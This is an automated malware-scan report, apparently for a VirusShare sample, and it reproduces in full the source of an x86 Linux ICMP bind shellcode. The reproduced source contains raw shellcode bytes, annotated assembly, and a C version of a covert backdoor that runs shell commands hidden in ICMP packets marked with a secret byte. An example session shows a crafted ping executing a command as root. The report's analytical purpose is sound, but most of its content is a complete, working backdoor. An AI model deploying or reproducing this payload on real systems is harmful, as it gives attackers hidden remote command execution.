{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "call": "May call a DLL using Excel 4 Macros",
            "execve": "May run an executable file or a system command on a Mac",
            "shell": "May run an executable file or a system command"
        },
        "macro": "/*\n\tx86 linux icmp bind shellcode (137 bytes) by gloomy@netric.org\n\n[example]\n\n main:/home/gloomy/security/shellcode/linux/icmp# ./icmp\n Size of shellcode = 137\n\n main:/home/gloomy/security/shellcode/linux/icmp# ping -p 992f7573722f62696e2f69643e6f7574 -c 1 -s 26 localhost\n PATTERN: 0x992f7573722f62696e2f69643e6f7574 (\\x99/usr/bin/id>out)\n 34 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.5 ms\n main:/home/gloomy/security/shellcode/linux/icmp# cat out\n uid=0(root) gid=0(root) groups=0(root)\n main:/home/gloomy/security/shellcode/linux/icmp#\n\n*/\n\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\n#define SECRET_CHAR\t\"\\x99\"\n\nchar shell[] =\n\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\"\n\t\"\\x43\\x41\\x51\\xb1\\x03\\x51\\x49\\x51\"\n\t\"\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x02\"\n\t\"\\xcd\\x80\\x31\\xdb\\x39\\xc3\\x75\\x55\"\n\t\"\\x31\\xc0\\x31\\xdb\\xb0\\x10\\x50\\xb0\"\n\t\"\\xff\\x54\\x54\\x53\\x50\\x55\\x52\\x89\"\n\t\"\\xe1\\xb0\\x66\\xb3\\x0c\\xcd\\x80\\x89\"\n\t\"\\xe9\\x01\\xc1\\x31\\xc0\\x88\\x41\\xfe\"\n\t\"\\xb0\\x25\\x01\\xc5\\xb0\" SECRET_CHAR\n\t\"\\x32\\x45\\xff\\x75\\xd5\\xb0\\x02\\xcd\"\n\t\"\\x80\\x31\\xdb\\x39\\xc3\\x74\\x25\\xeb\"\n\t\"\\xc9\\x31\\xc0\\x31\\xdb\\xb3\\x02\\xb0\"\n\t\"\\x06\\xcd\\x80\\x5b\\x89\\xd9\\x88\\x43\"\n\t\"\\x07\\x80\\xc1\\x08\\x50\\x55\\x51\\x53\"\n\t\"\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\\x31\"\n\t\"\\xc0\\x40\\xcd\\x80\\xe8\\xd8\\xff\\xff\"\n\t\"\\xff\"\n\t\"/bin/sh -c\";\n\nvoid asm_code() {\n\t__asm(\"\n\t\txorl %eax,%eax\n\t\txorl %ebx,%ebx\n\t\txorl %ecx,%ecx\n\t\tmovb $0x66,%al\n\t\tincl %ebx\n\t\tincl %ecx\n\t\tpush %ecx\n\t\tmovb $0x3,%cl\n\t\tpush %ecx\n\t\tdecl %ecx\n\t\tpush %ecx\n\t\tmovl %esp,%ecx\n\t\tint  $0x80\t\t/* socket(); */\n\t\tmovl %eax,%edx\n\n\t\tmovb $0x2,%al\n\t\tint  $0x80\t\t/* fork(); */\n\t\txorl %ebx,%ebx\n\t\tcmpl %eax,%ebx\n\t\tjne  exit\n\n\tendlessloop:\n\t\txorl %eax,%eax\n\t\txorl %ebx,%ebx\n\t\tmovb $0x10,%al\n\t\tpush %eax\n\t\tmovb $0xff,%al\n\t\tpush %esp\n\t\tpush %esp\n\t\tpush %ebx\n\t\tpush %eax\n\t\tpush %ebp\n\t\tpush %edx\n\t\tmovl %esp,%ecx\t\n\t\tmovb $0x66,%al\n\t\tmovb $0x0c,%bl\n\t\tint  $0x80\t\t/* recvfrom(); */\n\n\t\tmovl %ebp,%ecx\n\t\taddl %eax,%ecx\n\t\txorl %eax,%eax\n\t\tmovb %al,-2(%ecx)\n\t\tmovb $0x25,%al\n\t\taddl %eax,%ebp\n\t\tmovb $0x99,%al\t\t/* SECRET_CHAR */\n\t\txorb -1(%ebp),%al\n\t\tjnz  endlessloop\n\t\t\n\t\tmovb $0x2,%al\n\t\tint  $0x80\t\t/* fork(); */\n\t\txorl %ebx,%ebx\n\t\tcmpl %eax,%ebx\t\n\t\tje   stack \t\n\t\tjmp  endlessloop \n\texecve:\n\t\txorl %eax,%eax\n\t\txorl %ebx,%ebx\n\t\tmovb $0x2,%bl\n\t\tmovb $0x6,%al\n\t\tint  $0x80\t\t/* close(); */\n\n\t\tpop  %ebx\n\t\tmovl %ebx,%ecx\n\t\tmovb %al,0x7(%ebx)\n\t\taddb $0x8,%cl\n\t\tpush %eax\n\t\tpush %ebp\n\t\tpush %ecx\n\t\tpush %ebx\n\t\tmovl %esp,%ecx\n\t\tcdq\n\t\tmovb $0xb,%al\n\t\tint  $0x80\t\t/* execve(); */\n\texit:\n\t\txorl %eax,%eax\n\t\tincl %eax\n\t\tint  $0x80\t\t/* exit(); */\n\tstack:\n\t\tcall execve\n\t\t.string \\\"/bin/sh -c\\\"\n\t\t\n\t\");\n}\n\n\nvoid c_code() {\n\tint fd;\n\tint nb = 0;\n\tstruct sockaddr_in them;\n\tint them_size = sizeof(struct sockaddr);\n\tchar buf[256];\n\tchar *prog[] = {\"/bin/sh\",\"-c\",&buf[37],NULL};\n\n\tfd = socket(2,3,1);\n\tif (fork() > 0) exit(0);\n\twhile (1) {\n\t\twhile (!(nb = recvfrom(fd,buf,255,0,(struct sockaddr *)&them,&them_size)));\n\t\tbuf[nb-1] = 0;\n\t\tif (buf[36] == (char)SECRET_CHAR)\n\t\t\tif (fork() == 0) { close(2); execve(prog[0],prog,NULL); }\n\t}\n}\n\nint main(int c,char *v[]) {\n\tvoid (*i)();\n\ti = (void (*)())shell;\n\tfprintf(stderr,\"Size of shellcode = %d\\n\\n\",strlen(shell));\n\ti();\n\treturn 0;\n}"
    },
    "filename": "VirusShare_2f3612283cf80d8fdebcf7c813db44ea",
    "filesize": 3154,
    "filetype": "C source, ASCII text",
    "hashes": {
        "md5": "2f3612283cf80d8fdebcf7c813db44ea",
        "sha1": "b39b5dcb493abd239a59b0c25b135b475c5a2d34",
        "sha256": "9b7f1bf697b9a01fb4663131fe0f9e6fccb1296052337e0f27f72333d60f55df"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "\tx86 linux icmp bind shellcode (137 bytes) by gloomy@netric.org",
            "[example]",
            " main:/home/gloomy/security/shellcode/linux/icmp# ./icmp",
            " Size of shellcode = 137",
            " main:/home/gloomy/security/shellcode/linux/icmp# ping -p 992f7573722f62696e2f69643e6f7574 -c 1 -s 26 localhost",
            " PATTERN: 0x992f7573722f62696e2f69643e6f7574 (\\x99/usr/bin/id>out)",
            " 34 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.5 ms",
            " main:/home/gloomy/security/shellcode/linux/icmp# cat out",
            " uid=0(root) gid=0(root) groups=0(root)",
            " main:/home/gloomy/security/shellcode/linux/icmp#",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#define SECRET_CHAR\t\"\\x99\"",
            "char shell[] =",
            "\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\"",
            "\t\"\\x43\\x41\\x51\\xb1\\x03\\x51\\x49\\x51\"",
            "\t\"\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x02\"",
            "\t\"\\xcd\\x80\\x31\\xdb\\x39\\xc3\\x75\\x55\"",
            "\t\"\\x31\\xc0\\x31\\xdb\\xb0\\x10\\x50\\xb0\"",
            "\t\"\\xff\\x54\\x54\\x53\\x50\\x55\\x52\\x89\"",
            "\t\"\\xe1\\xb0\\x66\\xb3\\x0c\\xcd\\x80\\x89\"",
            "\t\"\\xe9\\x01\\xc1\\x31\\xc0\\x88\\x41\\xfe\"",
            "\t\"\\xb0\\x25\\x01\\xc5\\xb0\" SECRET_CHAR",
            "\t\"\\x32\\x45\\xff\\x75\\xd5\\xb0\\x02\\xcd\"",
            "\t\"\\x80\\x31\\xdb\\x39\\xc3\\x74\\x25\\xeb\"",
            "\t\"\\xc9\\x31\\xc0\\x31\\xdb\\xb3\\x02\\xb0\"",
            "\t\"\\x06\\xcd\\x80\\x5b\\x89\\xd9\\x88\\x43\"",
            "\t\"\\x07\\x80\\xc1\\x08\\x50\\x55\\x51\\x53\"",
            "\t\"\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\\x31\"",
            "\t\"\\xc0\\x40\\xcd\\x80\\xe8\\xd8\\xff\\xff\"",
            "\t\"\\xff\"",
            "\t\"/bin/sh -c\";",
            "void asm_code() {",
            "\t__asm(\"",
            "\t\txorl %eax,%eax",
            "\t\txorl %ebx,%ebx",
            "\t\txorl %ecx,%ecx",
            "\t\tmovb $0x66,%al",
            "\t\tincl %ebx",
            "\t\tincl %ecx",
            "\t\tpush %ecx",
            "\t\tmovb $0x3,%cl",
            "\t\tpush %ecx",
            "\t\tdecl %ecx",
            "\t\tpush %ecx",
            "\t\tmovl %esp,%ecx",
            "\t\tint  $0x80\t\t/* socket(); */",
            "\t\tmovl %eax,%edx",
            "\t\tmovb $0x2,%al",
            "\t\tint  $0x80\t\t/* fork(); */",
            "\t\txorl %ebx,%ebx",
            "\t\tcmpl %eax,%ebx",
            "\t\tjne  exit",
            "\tendlessloop:",
            "\t\txorl %eax,%eax",
            "\t\txorl %ebx,%ebx",
            "\t\tmovb $0x10,%al",
            "\t\tpush %eax",
            "\t\tmovb $0xff,%al",
            "\t\tpush %esp",
            "\t\tpush %esp",
            "\t\tpush %ebx",
            "\t\tpush %eax",
            "\t\tpush %ebp",
            "\t\tpush %edx",
            "\t\tmovl %esp,%ecx\t",
            "\t\tmovb $0x66,%al",
            "\t\tmovb $0x0c,%bl",
            "\t\tint  $0x80\t\t/* recvfrom(); */",
            "\t\tmovl %ebp,%ecx",
            "\t\taddl %eax,%ecx",
            "\t\txorl %eax,%eax",
            "\t\tmovb %al,-2(%ecx)",
            "\t\tmovb $0x25,%al",
            "\t\taddl %eax,%ebp",
            "\t\tmovb $0x99,%al\t\t/* SECRET_CHAR */",
            "\t\txorb -1(%ebp),%al",
            "\t\tjnz  endlessloop",
            "\t\tmovb $0x2,%al",
            "\t\tint  $0x80\t\t/* fork(); */",
            "\t\txorl %ebx,%ebx",
            "\t\tcmpl %eax,%ebx\t",
            "\t\tje   stack \t",
            "\t\tjmp  endlessloop ",
            "\texecve:",
            "\t\txorl %eax,%eax",
            "\t\txorl %ebx,%ebx",
            "\t\tmovb $0x2,%bl",
            "\t\tmovb $0x6,%al",
            "\t\tint  $0x80\t\t/* close(); */",
            "\t\tpop  %ebx",
            "\t\tmovl %ebx,%ecx",
            "\t\tmovb %al,0x7(%ebx)",
            "\t\taddb $0x8,%cl",
            "\t\tpush %eax",
            "\t\tpush %ebp",
            "\t\tpush %ecx",
            "\t\tpush %ebx",
            "\t\tmovl %esp,%ecx",
            "\t\tcdq",
            "\t\tmovb $0xb,%al",
            "\t\tint  $0x80\t\t/* execve(); */",
            "\texit:",
            "\t\txorl %eax,%eax",
            "\t\tincl %eax",
            "\t\tint  $0x80\t\t/* exit(); */",
            "\tstack:",
            "\t\tcall execve",
            "\t\t.string \\\"/bin/sh -c\\\"",
            "\t\");",
            "void c_code() {",
            "\tint fd;",
            "\tint nb = 0;",
            "\tstruct sockaddr_in them;",
            "\tint them_size = sizeof(struct sockaddr);",
            "\tchar buf[256];",
            "\tchar *prog[] = {\"/bin/sh\",\"-c\",&buf[37],NULL};",
            "\tfd = socket(2,3,1);",
            "\tif (fork() > 0) exit(0);",
            "\twhile (1) {",
            "\t\twhile (!(nb = recvfrom(fd,buf,255,0,(struct sockaddr *)&them,&them_size)));",
            "\t\tbuf[nb-1] = 0;",
            "\t\tif (buf[36] == (char)SECRET_CHAR)",
            "\t\t\tif (fork() == 0) { close(2); execve(prog[0],prog,NULL); }",
            "int main(int c,char *v[]) {",
            "\tvoid (*i)();",
            "\ti = (void (*)())shell;",
            "\tfprintf(stderr,\"Size of shellcode = %d\\n\\n\",strlen(shell));",
            "\ti();",
            "\treturn 0;"
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "\t\"\\xc0\\x40\\xcd\\x80\\xe8\\xd8\\xff\\xff\""
            ]
        },
        "ip": [
            "127.0.0.1"
        ],
        "url": []
    },
    "time": "0:00:00.289514",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
